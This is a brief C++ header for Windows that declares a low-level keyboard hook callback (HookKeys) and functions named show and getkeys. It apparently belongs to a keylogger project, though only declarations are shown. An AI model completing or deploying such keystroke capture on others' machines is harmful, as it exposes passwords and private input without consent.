#pragma once
#include<iostream>
#include<windows.h>
#include<fstream>


void show(int key); 
LRESULT __stdcall HookKeys(int nCode, WPARAM wParam, LPARAM lParam);

int getkeys(time_t &start);